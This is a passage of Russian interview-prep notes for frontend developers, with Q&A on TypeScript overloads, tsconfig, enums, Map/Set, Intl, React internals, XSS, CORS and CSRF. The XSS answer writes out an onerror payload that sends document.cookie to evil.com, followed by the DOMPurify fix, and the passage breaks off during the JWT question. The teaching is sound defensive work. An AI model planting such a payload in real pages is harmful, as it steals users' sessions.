> *"Module Augmentation — способ расширять сторонние библиотеки без форков и `@ts-ignore`. На каждый день: расширение `window` для метрик и feature flags, расширение тем MUI/styled-components для дизайн-системы, расширение Request в Express для middleware данных."*

---

### ❓ Q38. Function Overloads?

**Официальный ответ:**

```ts
// Несколько сигнатур + одна реализация
function process(input: string): string;
function process(input: number): number;
function process(input: string[]): string[];
// Реализация — широкие типы, не видна снаружи
function process(input: string | number | string[]): string | number | string[] {
  if (Array.isArray(input)) return input.map(s => s.toUpperCase());
  if (typeof input === 'string') return input.toUpperCase();
  return input * 2;
}

// TS выведет правильный тип по аргументу:
const a = process('hello');    // тип: string ✅
const b = process(42);         // тип: number ✅
const c = process(['a', 'b']); // тип: string[] ✅
```

```ts
// Реальный пример: createElement с разными типами элементов
function createElement(tag: 'div'): HTMLDivElement;
function createElement(tag: 'input'): HTMLInputElement;
function createElement(tag: 'canvas'): HTMLCanvasElement;
function createElement(tag: string): HTMLElement {
  return document.createElement(tag);
}

const div = createElement('div');     // HTMLDivElement ✅
const input = createElement('input'); // HTMLInputElement ✅
// input.value доступно, div.value — нет!
```

**🗣️ Pitch (Senior):**
> *"Overloads полезны когда тип возврата зависит от типа аргумента. Сегодня чаще используют Conditional Types + Generics — они мощнее и не требуют дублирования сигнатур. Overloads же применяют для описания сложных DOM API (как в `lib.dom.d.ts`) или библиотечных функций с явно разными перегрузками."*

---

### ❓ Q39. Декораторы: Stage 3 (TS 5.0) vs legacy?

**Официальный ответ:**

```ts
// Legacy decorators (experimentalDecorators: true) — основа Angular/NestJS
function log(target: any, key: string, descriptor: PropertyDescriptor) {
  const original = descriptor.value;
  descriptor.value = function(...args: any[]) {
    console.log(`Вызов ${key} с аргументами:`, args);
    const result = original.apply(this, args);
    console.log(`${key} вернул:`, result);
    return result;
  };
  return descriptor;
}

class UserService {
  @log
  getUser(id: string) {
    return { id, name: 'Alice' };
  }
}
```

```ts
// NestJS паттерн — декораторы как Dependency Injection
@Injectable()
class UserService {
  constructor(private readonly db: DatabaseService) {} // DI ✅
}

@Controller('/users')
class UserController {
  constructor(private readonly users: UserService) {}

  @Get('/:id')
  getUser(@Param('id') id: string) {
    return this.users.getUser(id);
  }
}
```

**🗣️ Pitch (Senior):**
> *"Декораторы — основа мета-программирования в Angular и NestJS. Dependency Injection через `reflect-metadata`: TS записывает типы аргументов конструктора в метаданные (`emitDecoratorMetadata: true`), а DI-контейнер читает их и автоматически подставляет инстансы. В React декораторы отмерли с уходом от классов — HOC и хуки заменили `@connect`."*

---

### ❓ Q40. `tsconfig.json` — ключевые флаги?

**Официальный ответ:**

```jsonc
{
  "compilerOptions": {
    // === Строгость (маст-хэв) ===
    "strict": true,               // включает все строгие флаги:
    // strictNullChecks       — null/undefined не совместимы с типами
    // noImplicitAny          — нельзя неявно использовать any
    // strictFunctionTypes    — строгая контравариантность функций
    // strictBindCallApply    — типизированные .bind/.call/.apply

    // === Компиляция ===
    "target": "ESNext",           // до какого ES компилировать
    // Если Babel занимается транспиляцией — ESNext (только типы)
    // Если TS транспилирует сам — ES2019/2020 для совместимости

    // === Модули ===
    "module": "ESNext",
    "moduleResolution": "bundler", // для Vite/Next.js (вместо "node")
    // "node" — ищет в node_modules по алгоритму Node.js
    // "bundler" — для современных бандлеров, поддерживает exports field

    // === Скорость сборки ===
    "skipLibCheck": true,         // пропускает .d.ts в node_modules
    // (если у зависимостей конфликтующие типы)
    "incremental": true,          // кэширует предыдущую компиляцию

    // === Безопасность ===
    "noUncheckedIndexedAccess": true, // arr[0] → T | undefined (не T!)
    "exactOptionalPropertyTypes": true, // { x?: string } не принимает undefined

    // === Пути ===
    "baseUrl": ".",
    "paths": {
      "@/*": ["./src/*"]         // алиасы для импортов
    }
  }
}
```

**🗣️ Pitch (Senior):**
> *"Настройка tsconfig — баланс между скоростью сборки и type safety. Всегда стартую со `strict: true`. `noUncheckedIndexedAccess` — крутейший флаг: `arr[i]` возвращает `T | undefined`, заставляя делать проверки. `moduleResolution: bundler` — для Vite/Next.js, убирает проблемы с расширениями файлов в импортах. `skipLibCheck` ускоряет сборку, но прячет конфликты типов библиотек."*

---

## РАЗДЕЛ 6: TypeScript: Хардкор

---

### ❓ Q51. Type Inference vs Type Checking?

**Официальный ответ:**

```ts
// Type Inference — TS догадывается о типе сам
const x = 42;              // number (из значения)
const arr = [1, 'hello'];  // (number | string)[] (из содержимого)

function identity<T>(val: T): T { return val; } // T выводится из аргумента
const result = identity(42); // T = number (без явной аннотации!)

// Contextual Typing — тип из контекста использования
window.addEventListener('click', (e) => {
  // e выведен как MouseEvent из сигнатуры addEventListener ✅
  e.clientX; // работает без аннотации
});
```

```ts
// Минимизируй аннотации — давай Inference работать
// ❌ Избыточно
const user: User = { name: 'Alice', age: 30 }; // и так понятно из структуры
const getName = (u: User): string => u.name;    // return type лишний

// ✅ Аннотируй только на границах систем
async function fetchUser(id: string): Promise<User> { // ← явно для API границы
  const response = await fetch(`/api/users/${id}`);
  return response.json() as User; // ← явно для unknown из fetch
}
```

**🗣️ Pitch (Senior):**
> *"Идеальный TS-код пишет минимум аннотаций — Inference делает 90% работы. Чрезмерная ручная типизация ломает Narrowing. Но на границах систем (API ответы, публичный API библиотеки, аргументы функций в props) явная типизация — маст-хэв для надёжности."*

---

### ❓ Q52. Variance модификаторы `in` и `out` (TS 4.7+)?

**Официальный ответ:**

```ts
// Без модификаторов — TS вычисляет вариантность структурно
// (медленно для сложных типов)
interface Container<T> {
  value: T;
  transform: (val: T) => T;
}

// С явными модификаторами — быстрее компиляция + точнее семантика
interface Producer<out T> {   // out = T только возвращается
  get value(): T;
  produce(): T;
}

interface Consumer<in T> {    // in = T только принимается как аргумент
  consume(val: T): void;
  process(input: T): void;
}

interface Transformer<in TIn, out TOut> { // принимает TIn, возвращает TOut
  transform(input: TIn): TOut;
}
```

**🗣️ Pitch (Senior):**
> *"Для сложных реактивных сторов вычисление вариантности приводило к долгой компиляции и переполнению стека ('Type instantiation is excessively deep'). Явные `in/out` — подсказка компилятору пропустить структурный анализ. Это важно в монорепозиториях с большими shared-пакетами."*

---

### ❓ Q53. Template Literal Types?

**Официальный ответ:**

```ts
// Базовый синтаксис
type Greeting = `Hello, ${string}!`;
type EventName = `on${Capitalize<'click' | 'hover' | 'focus'>}`;
// 'onClick' | 'onHover' | 'onFocus'
```

```ts
// Практика: типизированный CSS-в-JS
type CSSUnit = 'px' | 'em' | 'rem' | 'vh' | 'vw' | '%';
type CSSValue = `${number}${CSSUnit}`;

const spacing: CSSValue = '16px';  // ✅
const bad: CSSValue = '16pt';      // ❌ TS Error
```

```ts
// Продвинуто: извлечение параметров из строки роута
type ExtractRouteParams<S extends string> =
  S extends `${string}:${infer Param}/${infer Rest}`
    ? Param | ExtractRouteParams<Rest>
    : S extends `${string}:${infer Param}`
    ? Param
    : never;

type RouterParams = ExtractRouteParams<'/users/:userId/posts/:postId'>;
// 'userId' | 'postId'

function navigate<Path extends string>(
  path: Path,
  params: { [K in ExtractRouteParams<Path>]: string }
) {
  // ...
}

navigate('/users/:userId', { userId: '123' });         // ✅
navigate('/users/:userId', { wrongParam: '123' });     // ❌ Error
navigate('/users/:userId', {});                        // ❌ Error (userId required)
```

**🗣️ Pitch (Senior):**
> *"Template Literal Types перевернули разработку библиотек. В связке с Mapped Types создаём Event Handler типы: `on${Capitalize<EventName>}`. В связке с infer — парсим роуты и SQL-запросы прямо на уровне типов. Это TypeScript как язык метапрограммирования."*

---

### ❓ Q55. Enums vs Const Enums vs POJO + `isolatedModules`?

**Официальный ответ:**

```ts
// Regular Enum — рантайм объект (bidirectional mapping)
enum Direction { Up = 'UP', Down = 'DOWN' }
Direction.Up;            // 'UP'
Direction['UP'];         // ошибка — строковые enum без reverse mapping

// Компилируется в РАНТАЙМ код:
var Direction;
(function (Direction) {
  Direction["Up"] = "UP";
  Direction["Down"] = "DOWN";
})(Direction || (Direction = {}));
```

```ts
// Const Enum — инлайнится, нет рантайм кода
const enum Size { Small = 1, Medium = 2, Large = 3 }
const mySize = Size.Medium;
// Компилируется в: const mySize = 2; /* Size.Medium */

// ❌ ЛОМАЕТСЯ при isolatedModules: true (Vite, Next.js, Babel)
// Каждый файл компилируется отдельно — значения const enum из других файлов недоступны
```

```ts
// ✅ POJO + as const — современный стандарт
// Нет рантайм мусора, работает с isolatedModules, дружит с tree shaking

const Direction = {
  Up: 'UP',
  Down: 'DOWN',
  Left: 'LEFT',
  Right: 'RIGHT',
} as const;

type Direction = typeof Direction[keyof typeof Direction];
// 'UP' | 'DOWN' | 'LEFT' | 'RIGHT'

function move(dir: Direction) { /* ... */ }
move(Direction.Up);  // ✅
move('UP');          // ✅ литерал тоже принимается
move('DIAGONAL');    // ❌ TS Error
```

---

### ❓ Q56. `Object` vs `object` vs `{}`?

**Официальный ответ:**

```ts
// object (маленькая) — любой НЕ-примитив
let o: object;
o = {};             // ✅
o = [];             // ✅ (массив — объект)
o = () => {};       // ✅ (функция — объект)
o = 1;              // ❌ number — примитив
o = 'str';          // ❌ string — примитив

// {} (пустой объект) — почти всё кроме null/undefined (опасно!)
let x: {};
x = 1;              // ✅ (примитивы имеют объектные обёртки)
x = 'str';          // ✅
x = {};             // ✅
x = null;           // ❌ только null/undefined исключены
x = undefined;      // ❌

// Object (большая) — интерфейс Object.prototype (практически не используют)
// {} и Object практически одинаковы — оба включают примитивы!

// ✅ Правильные типы для разных случаев
let dict: Record<string, unknown>;     // типизированный словарь
let anyObj: Record<string, any>;       // словарь без проверок значений
let pureObj: { [key: string]: string };// конкретная структура

// noUncheckedIndexedAccess: true → dict['key'] возвращает string | undefined
```

**🗣️ Pitch (Senior):**
> *"Никогда не используйте `{}` для 'пустого объекта' — TS разрешит передать туда число или строку (у них есть объектные обёртки). Для строгих словарей — `Record<string, unknown>`. Флаг `noUncheckedIndexedAccess` делает динамические словари намного безопаснее: `dict[key]` возвращает `T | undefined`, заставляя писать явные проверки."*

---

### ❓ Q58. Index Signatures и опасность?

**Официальный ответ:**

```ts
// Index Signature — разрешает любые ключи
interface Config {
  [key: string]: string | number; // ← опасный тип
  timeout: number;                // конкретные поля тоже можно
}

const config: Config = { timeout: 5000, host: 'localhost' };
config.nonexistent; // тип: string | number — TS думает что есть!
// Но в рантайме это undefined!
```

```ts
// ✅ noUncheckedIndexedAccess: true — решает проблему
// config.nonexistent → string | number | undefined

// ✅ Лучше использовать Record с явным обращением
type Config = Record<string, unknown>;
function get(config: Config, key: string): unknown {
  const val = config[key]; // unknown (с noUncheckedIndexedAccess: unknown | undefined)
  if (val === undefined) throw new Error(`Config key ${key} not found`);
  return val;
}
```

---

### ❓ Q60. Project References в tsconfig (Монорепозитории)?

**Официальный ответ:**

```json
// packages/shared/tsconfig.json
{
  "compilerOptions": {
    "composite": true,         // ← обязательно для referenced пакетов
    "declaration": true,
    "outDir": "./dist"
  }
}

// packages/frontend/tsconfig.json
{
  "compilerOptions": { "strict": true },
  "references": [
    { "path": "../shared" }    // ← зависимость от shared
  ]
}

// packages/backend/tsconfig.json
{
  "references": [
    { "path": "../shared" }
  ]
}
```

```bash
# Сборка только изменившихся пакетов (инкрементально)
tsc --build

# TS кэширует .d.ts для shared.
# Изменение frontend НЕ пересобирает backend и наоборот.
```

**🗣️ Pitch (Senior):**
> *"Без Project References в монорепозиториях сборка занимает часы, а IDE виснет — TS анализирует весь граф как единый проект. С references каждый пакет компилируется независимо, IDE использует кэшированные `.d.ts`, и `tsc --build` пересобирает только изменившееся. В Turborepo/Nx это работает совместно с кэшированием задач на CI."*

---

## РАЗДЕЛ 7: Performance и Архитектура

---

### ❓ Q41. Design Patterns: Singleton, Observer, Mediator?

**Официальный ответ:**

```js
// Singleton — один экземпляр через ES Module
// singleton.js — сам модуль и есть singleton!
let connectionCount = 0;

export class Database {
  constructor(url) {
    this.url = url;
    connectionCount++;
  }
  query(sql) { /* ... */ }
}

// ✅ Экспортируем ЭКЗЕМПЛЯР, не класс
export const db = new Database('postgres://localhost/mydb');
// Любой импорт получит один и тот же объект (ESM кэширует модули)
```

```js
// Observer / EventEmitter — Pub-Sub
class EventEmitter {
  #listeners = new Map();

  on(event, callback) {
    if (!this.#listeners.has(event)) {
      this.#listeners.set(event, new Set());
    }
    this.#listeners.get(event).add(callback);
    return () => this.off(event, callback); // unsubscribe функция
  }

  off(event, callback) {
    this.#listeners.get(event)?.delete(callback);
  }

  emit(event, data) {
    this.#listeners.get(event)?.forEach(cb => cb(data));
  }
}

// Использование (Zustand под капотом работает аналогично)
const store = new EventEmitter();
const unsubscribe = store.on('update', (state) => renderUI(state));
store.emit('update', newState);
// При размонтировании:
unsubscribe();
```

---

### ❓ Q42. Map и Set vs Object и Array (Performance)?

**Официальный ответ:**

```js
// Object vs Map
// Object оптимизирован V8 для статических ключей
// Map стабильнее при частых мутациях (add/delete)

const obj = {};
delete obj.key; // может деоптимизировать весь объект!

const map = new Map();
map.delete('key'); // оптимизирован именно для этого ✅

// Map сохраняет порядок вставки и поддерживает любые ключи
const map2 = new Map();
map2.set({}, 'object key');     // ✅ объект как ключ
map2.set(() => {}, 'fn key');   // ✅ функция как ключ
map2.set(42, 'number key');     // ✅ число как ключ
```

```js
// Array.includes vs Set.has — разница для больших коллекций
const arr = Array.from({ length: 1_000_000 }, (_, i) => i.toString());
const set = new Set(arr);
const target = '999999';

console.time('Array.includes');
arr.includes(target); // O(n) — линейный поиск
console.timeEnd('Array.includes'); // ~10ms

console.time('Set.has');
set.has(target); // O(1) амортизированная сложность
console.timeEnd('Set.has'); // ~0.01ms
```

```js
// Дедупликация — Set идеален
const withDuplicates = [1, 2, 3, 2, 1, 4, 3, 5];
const unique = [...new Set(withDuplicates)]; // [1, 2, 3, 4, 5]

// Пересечение массивов
function intersection(a, b) {
  const setB = new Set(b);
  return a.filter(x => setB.has(x)); // O(n+m) вместо O(n*m)
}
```

**🗣️ Pitch (Senior):**
> *"Object в V8 хорошо оптимизирован для статических ключей с одинаковым Shape, но при удалении ключей может деоптимизироваться в dictionary mode. Map создан для динамических коллекций с частыми add/delete. Set — для уникальных значений: проверка `has()` с амортизированной O(1) сложностью против O(n) у `Array.includes`."*

---

### ❓ Q43. BigInt в JavaScript?

**Официальный ответ:**

```js
// Проблема: Number теряет точность выше 2^53 - 1
const MAX_SAFE = Number.MAX_SAFE_INTEGER; // 9007199254740991
console.log(MAX_SAFE + 1); // 9007199254740992 ✅
console.log(MAX_SAFE + 2); // 9007199254740992 ❌ одинаково! (потеря точности)
```

```js
// BigInt — точные вычисления для больших чисел
const big = 9007199254740993n; // суффикс n
const big2 = BigInt('9007199254740993'); // или конструктор

big + 2n; // 9007199254740995n ✅
big * 100n; // работает с любыми большими числами

// ❌ Нельзя смешивать с number
big + 1;   // TypeError: Cannot mix BigInt and other types
big + 1n;  // ✅ оба BigInt
```

```js
// Финтех: большие ID из бэкенда
// ❌ Обычный JSON.parse теряет точность
const json = '{"transactionId": 9007199254740993}';
JSON.parse(json).transactionId; // 9007199254740992 — потеряли!

// ✅ Перехватываем через reviver или regex-замену
const fixed = json.replace(
  /:\s*(\d{16,})/g, // числа длиннее 15 цифр
  ': "$1"'          // оборачиваем в строку
);
const data = JSON.parse(fixed);
BigInt(data.transactionId); // 9007199254740993n ✅
```

**🗣️ Pitch (Senior):**
> *"В финтехе и крипте — маст-хэв. JSON не поддерживает BigInt нативно, поэтому большие числа теряют точность при `JSON.parse`. Решение: перехватывать большие числовые значения через regex-замену или кастомный JSON parser до парсинга. На бэке — аналогично через jackson-databind настройки."*

---

### ❓ Q44. IntersectionObserver & ResizeObserver?

**Официальный ответ:**

```js
// IntersectionObserver — видимость элемента
// ⚠️ Вычисления асинхронные и не вызывают Reflow,
// но колбэк выполняется на Main Thread

// Lazy Loading изображений
const imageObserver = new IntersectionObserver(
  (entries, observer) => {
    entries.forEach(entry => {
      if (entry.isIntersecting) {
        const img = entry.target;
        img.src = img.dataset.src;      // загружаем реальное изображение
        img.classList.add('loaded');
        observer.unobserve(img);        // больше не следим
      }
    });
  },
  {
    threshold: 0.1,    // 10% элемента видно
    rootMargin: '50px' // начинать загрузку за 50px до появления
  }
);

document.querySelectorAll('img[data-src]').forEach(img => {
  imageObserver.observe(img);
});
```

```js
// Infinite Scroll
const sentinel = document.querySelector('#list-end');
const scrollObserver = new IntersectionObserver(
  ([entry]) => {
    if (entry.isIntersecting) {
      loadMoreItems();
    }
  },
  { rootMargin: '100px' }
);
scrollObserver.observe(sentinel);
```

```js
// ResizeObserver — изменения размеров элемента
// (не то что window.resize — следит за конкретным элементом)
const resizeObserver = new ResizeObserver(entries => {
  entries.forEach(({ target, contentRect }) => {
    // contentRect — новые размеры без рамок/отступов
    if (contentRect.width < 600) {
      target.classList.add('compact');
    } else {
      target.classList.remove('compact');
    }
  });
});

resizeObserver.observe(document.querySelector('.responsive-chart'));
```

**🗣️ Pitch (Senior):**
> *"IntersectionObserver — стандарт для Lazy Loading, Infinite Scroll и аналитики показов. Он не вызывает принудительный Reflow как `getBoundingClientRect()` в scroll-обработчике. ResizeObserver заменяет хак с `window.resize` + проверкой размеров элемента — теперь можно делать компонентно-уровневые responsive правила без медиа-запросов."*

---

### ❓ Q45. Node.js Event Loop vs Browser?

**Официальный ответ:**

```
Браузер:          Node.js (libuv):
Microtasks        nextTick queue (ПРИОРИТЕТНЕЕ Promise!)
Macrotasks        timers (setTimeout/setInterval)
  - setTimeout    pending callbacks
  - setInterval   idle/prepare
  - I/O           poll (I/O — главная фаза)
  - UI events     check (setImmediate)
                  close callbacks
```

```js
// Node.js — порядок приоритетов
setImmediate(() => console.log('4 — setImmediate (check)'));
setTimeout(() => console.log('3 — setTimeout (timers)'), 0);
Promise.resolve().then(() => console.log('2 — Promise (microtask)'));
process.nextTick(() => console.log('1 — nextTick (ДО microtasks!)'));
console.log('0 — синхронный');

// Вывод: 0 → 1 → 2 → 3 или 4 (порядок 3/4 зависит от системы)
// ⚠️ process.nextTick быстрее Promise — Node.js специфика!
```

```js
// ❌ Опасность: рекурсивный nextTick = starvation I/O
function badRecursion() {
  process.nextTick(badRecursion); // Event Loop НИКОГДА не сдвинется!
  // Все I/O операции заблокированы навсегда
}

// ✅ Безопасно: setImmediate даёт другим фазам поработать
function safeRecursion() {
  doWork();
  setImmediate(safeRecursion); // I/O работает между итерациями
}
```

---

### ❓ Q46. `Intl` API?

**Официальный ответ:**

```js
// Форматирование валюты — нет велосипедов!
const formatter = new Intl.NumberFormat('ru-RU', {
  style: 'currency',
  currency: 'RUB',
  minimumFractionDigits: 2,
});

formatter.format(1234567.89); // '1 234 567,89 ₽'

// Несколько валют
const currencies = {
  USD: new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD' }),
  EUR: new Intl.NumberFormat('de-DE', { style: 'currency', currency: 'EUR' }),
  JPY: new Intl.NumberFormat('ja-JP', { style: 'currency', currency: 'JPY' }),
};

currencies.USD.format(1234.5); // '$1,234.50'
currencies.EUR.format(1234.5); // '1.234,50 €'
currencies.JPY.format(1234);   // '¥1,234'
```

```js
// Форматирование дат
const dateFormatter = new Intl.DateTimeFormat('ru-RU', {
  year: 'numeric', month: 'long', day: 'numeric',
  hour: '2-digit', minute: '2-digit',
});
dateFormatter.format(new Date()); // '2 апреля 2026 г. в 15:30'

// Относительное время (как в соцсетях)
const rtf = new Intl.RelativeTimeFormat('ru', { numeric: 'auto' });
rtf.format(-1, 'day');    // 'вчера'
rtf.format(-3, 'day');    // '3 дня назад'
rtf.format(2, 'hour');    // 'через 2 часа'

// Сортировка строк с учётом локали
const names = ['Ёж', 'Антон', 'Берёза', 'абрикос'];
names.sort(new Intl.Collator('ru').compare);
// ['абрикос', 'Антон', 'Берёза', 'Ёж'] — правильный русский порядок

// Множественные числа
const plural = new Intl.PluralRules('ru');
plural.select(1);  // 'one'   → '1 сообщение'
plural.select(3);  // 'few'   → '3 сообщения'
plural.select(11); // 'many'  → '11 сообщений'
```

**🗣️ Pitch (Senior):**
> *"Многие проекты тянут тяжёлый momentjs (67KB) или date-fns там, где хватит встроенного браузерного API. `Intl.NumberFormat` создаю один раз и кэширую — создание инстанса дорогое, форматирование быстрое. В финтехе это ежедневный инструмент для балансов, курсов и транзакций."*

---

## РАЗДЕЛ 8: React под капотом

---

### ❓ Q61. Как работает `useState` под капотом?

**Официальный ответ:**

```js
// Упрощённая реализация внутреннего механизма React
let hooks = [];          // массив ячеек состояния
let currentComponent;   // текущий рендеримый компонент
let hookIndex = 0;       // счётчик хуков

function useState(initialValue) {
  const index = hookIndex; // захватываем текущий индекс

  // Инициализация только при первом рендере
  if (hooks[index] === undefined) {
    hooks[index] = typeof initialValue === 'function'
      ? initialValue()  // lazy initialization
      : initialValue;
  }

  function setState(newValue) {
    hooks[index] = typeof newValue === 'function'
      ? newValue(hooks[index]) // functional update — всегда актуальное значение
      : newValue;
    scheduleRerender(currentComponent);
  }

  hookIndex++; // сдвигаем счётчик для следующего хука

  return [hooks[index], setState];
}
```

```js
// ❌ Именно поэтому нельзя хуки в условиях!
function Component({ isLoggedIn }) {
  const [user, setUser] = useState(null);  // hooks[0]

  if (isLoggedIn) {
    // Рендер 1: isLoggedIn=true  → hooks[1] = cart
    // Рендер 2: isLoggedIn=false → hooks[1] = пропускается!
    // → hooks[1] теперь указывает на ДРУГОЙ хук! ❌ БАГИ
    const [cart, setCart] = useState([]);
  }

  const [theme, setTheme] = useState('light'); // hooks[1] или hooks[2]?
}

// ✅ Правило: порядок хуков ВСЕГДА должен быть одинаковым между рендерами
```

---

### ❓ Q62. Fiber Node как структура данных?

**Официальный ответ:**

```js
// Fiber Node — обычный JS объект
const fiberNode = {
  // Тип
  type: 'div',           // строка для DOM, функция для компонентов
  key: null,

  // DOM
  stateNode: domElement, // реальный DOM узел или инстанс класса

  // Linked List указатели (НЕ рекурсия!)
  child: childFiber,     // первый дочерний Fiber
  sibling: siblingFiber, // следующий брат
  return: parentFiber,   // родитель

  // Хуки (linked list внутри Fiber)
  memoizedState: {       // useState hook
    queue: updateQueue,
    next: nextHook,      // следующий хук этого компонента
  },

  // Concurrent Mode
  lanes: 0b0001,         // приоритет задачи (битовое поле)
  alternate: wip,        // альтернативный Fiber (double buffering)
};
```

```
Старый React 15 (Stack рекурсия):
renderApp()
  renderHeader()        ← нельзя прервать!
    renderNav()
  renderMain()
    renderPosts()       ← если долго, UI завис

React 16+ Fiber (итеративный обход):
while (workInProgress) {
  performUnitOfWork(workInProgress);  ← можно прервать между узлами!
  workInProgress = workInProgress.child
                 || workInProgress.sibling
                 || walkUp(workInProgress);

  if (shouldYield()) break;  ← браузер получает управление
}
```

**🗣️ Pitch (Senior):**
> *"Плоская структура Fiber Nodes с linked list указателями (child/sibling/return) позволила React прервать рендеринг между узлами и отдать управление браузеру — основа Concurrent Mode. Это как кооперативная многозадачность: React сам решает когда 'уступить дорогу' более приоритетным задачам (анимациям, вводу)."*

---

### ❓ Q63. React Batching до и после React 18?

**Официальный ответ:**

```js
// React 17 — батчинг ТОЛЬКО в синхронных React event handlers
function handleClick() {
  setCount(c => c + 1);  // не рендерит
  setFlag(f => !f);       // рендерит 1 раз ✅ (батч)
}

// React 17 — НЕ батчится в async, нативных событиях, setTimeout
async function handleAsyncOld() {
  const data = await fetchData();
  setData(data);    // рендер 1 ❌
  setLoading(false); // рендер 2 ❌
}

// React 18 — Automatic Batching ВЕЗДЕ
async function handleAsyncNew() {
  const data = await fetchData();
  setData(data);    // не рендерит
  setLoading(false); // рендерит 1 раз ✅
}
```

```js
// Принудительно выключить батчинг (flushSync)
import { flushSync } from 'react-dom';

function handleSpecialCase() {
  flushSync(() => {
    setFirst(1); // синхронный рендер прямо здесь
  });
  // DOM уже обновлён после flushSync
  flushSync(() => {
    setSecond(2); // ещё один синхронный рендер
  });
}
```

**🗣️ Pitch (Senior):**
> *"React 18 Automatic Batching использует внутренний Scheduler, который группирует обновления из разных источников. Если нужно синхронное обновление DOM (измерить layout после setState), используем `flushSync` — это вынуждает React немедленно синхронно отрендерить и записать в DOM."*

---

### ❓ Q64. Почему React использует `Object.is()`?

**Официальный ответ:**

```js
// Object.is() vs ===
// Два отличия:
Object.is(NaN, NaN);  // true  (=== даёт false!)
Object.is(+0, -0);    // false (=== даёт true!)

// React использует Object.is для сравнения стейта
function Component() {
  const [val, setVal] = useState(NaN);

  // ✅ Object.is(NaN, NaN) = true → React пропустит ре-рендер
  setVal(NaN); // не вызовет ре-рендер! Без Object.is был бы бесконечный цикл

  // С === : NaN !== NaN → React думает "значение изменилось" → ре-рендер → ∞
}
```

---

### ❓ Q65. XSS в React: `dangerouslySetInnerHTML`?

**Официальный ответ:**

```jsx
// React автоматически экранирует текст в JSX
const userInput = '<script>alert("XSS")</script>';
<div>{userInput}</div>
// Рендерит как текст: &lt;script&gt;alert("XSS")&lt;/script&gt; ✅
```

```jsx
// dangerouslySetInnerHTML — вставляет сырой HTML
// ❌ Без санитизации — критическая уязвимость
const payload = '<img src=x onerror="fetch(\'https://evil.com?c=\'+document.cookie)">';
<div dangerouslySetInnerHTML={{ __html: payload }} />
// Выполнит JS! Украдёт cookies!
```

```jsx
// ✅ Всегда санитизировать через DOMPurify
import DOMPurify from 'dompurify';

function RichText({ htmlContent }) {
  const clean = DOMPurify.sanitize(htmlContent, {
    ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'a', 'ul', 'li'],
    ALLOWED_ATTR: ['href', 'target', 'rel'],
  });

  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

**🗣️ Pitch (Senior):**
> *"В банковском SaaS, если рендерим HTML из WYSIWYG редактора — DOMPurify обязателен. Атака хранимый XSS (Stored XSS): злоумышленник сохраняет вредоносный HTML в базу, он показывается всем пользователям и выполняет JS в их браузере. Последствия — кража сессий, переводы от имени пользователя. DOMPurify вырежет все теги кроме разрешённых."*

---

### ❓ Q66. `useSyncExternalStore` и проблема Tearing?

**Официальный ответ:**

```
Проблема Tearing в Concurrent Mode:

  1. React начинает рендер Tree
  2. Рендерит Header → читает Store v1
  3. [React делает паузу — Concurrent]
  4. Внешний Store обновляется v1 → v2
  5. React продолжает рендер
  6. Рендерит Footer → читает Store v2  ← TEARING! Разрыв!
  Результат: Header показывает v1, Footer — v2
```

```js
// ✅ useSyncExternalStore — правильная подписка на внешний стор
import { useSyncExternalStore } from 'react';

// Пример: подписка на кастомный стор
function createStore(initialState) {
  let state = initialState;
  const subscribers = new Set();

  return {
    getState: () => state,
    setState: (newState) => {
      state = newState;
      subscribers.forEach(cb => cb());
    },
    subscribe: (callback) => {
      subscribers.add(callback);
      return () => subscribers.delete(callback); // unsubscribe
    },
  };
}

const userStore = createStore({ name: 'Alice', age: 30 });

function useUserStore() {
  return useSyncExternalStore(
    userStore.subscribe,     // (onStoreChange) => unsubscribe
    userStore.getState,      // () => snapshot (для браузера)
    userStore.getState,      // () => snapshot (для SSR)
  );
}
```

**🗣️ Pitch (Senior):**
> *"Tearing — проблема несогласованного UI: разные части экрана показывают разные версии данных из одного стора. `useSyncExternalStore` форсирует синхронный снапшот при чтении из внешних сторов в Concurrent Mode. Redux Toolkit, Zustand и Jotai используют именно этот хук для совместимости с React 18."*

---

## РАЗДЕЛ 9: Сеть и Безопасность

---

### ❓ Q67. CORS и Preflight запрос?

**Официальный ответ:**

```
Простые запросы (НЕТ preflight):
- GET/HEAD/POST
- Content-Type: text/plain, application/x-www-form-urlencoded, multipart/form-data
- Только стандартные заголовки

Сложные запросы (ЕСТЬ preflight OPTIONS):
- DELETE, PUT, PATCH
- Content-Type: application/json  ← почти всегда наш случай!
- Кастомные заголовки: Authorization, X-Custom-Header
```

```
Preflight flow:
Browser                         Server
OPTIONS /api/data  ──────────►  
Authorization: Bearer...
Origin: https://app.com

                   ◄──────────  200 OK
                                Access-Control-Allow-Origin: https://app.com
                                Access-Control-Allow-Methods: GET, POST, DELETE
                                Access-Control-Allow-Headers: Authorization
                                Access-Control-Max-Age: 86400  ← кэш preflight

POST /api/data     ──────────►  (основной запрос)
Authorization: Bearer...
                   ◄──────────  200 OK + данные
```

**🗣️ Pitch (Senior):**
> *"Preflight срабатывает для 'сложных' запросов — например, добавлен `Authorization` или `Content-Type: application/json`. Если сервер в ответ на OPTIONS не пришлёт правильный `Access-Control-Allow-Origin`, основной запрос молча умрёт в браузере. Важный момент: `Access-Control-Max-Age` кэширует preflight — не нужно делать лишний OPTIONS перед каждым запросом."*

---

### ❓ Q68. CSRF: SameSite, Anti-CSRF токены?

**Официальный ответ:**

```
CSRF атака:
1. Жертва авторизована на bank.com (есть сессионная куки)
2. Жертва открывает evil.com
3. evil.com делает POST /bank.com/transfer?to=hacker&amount=10000
4. Браузер подшивает куки bank.com к запросу (без защиты)!
5. Деньги ушли
```

```js
// ✅ SameSite — встроенная защита браузера
// Set-Cookie: session=abc123; SameSite=Lax; Secure; HttpOnly

// SameSite=Strict — куки не отправляются с ЛЮБОГО внешнего сайта
// SameSite=Lax    — куки отправляются при top-level навигации (GET ссылки)
//                   но НЕ при POST, fetch, img запросах с чужих сайтов
// SameSite=None   — всегда отправляются (нужен Secure!)

// Для большинства banking SPA: SameSite=Lax + HttpOnly + Secure
```

```js
// Anti-CSRF Token (Double Submit Cookie) — старый способ
// 1. Сервер генерирует случайный токен → в куки + в HTML форму
// 2. При POST клиент отправляет токен в заголовке
// 3. Сервер сравнивает — evil.com не может прочитать куки (SOP)

// Современный стеке: SameSite=Lax достаточно для большинства случаев
```

---

### ❓ Q69. JWT авторизация: Access/Refresh токены?

**Официальный ответ:**

```
Access Token:  короткоживущий (15 минут), для API запросов
Refresh Token: долгоживущий (30 дней), только для /refresh эндпоинта

Flow:
POST /login →
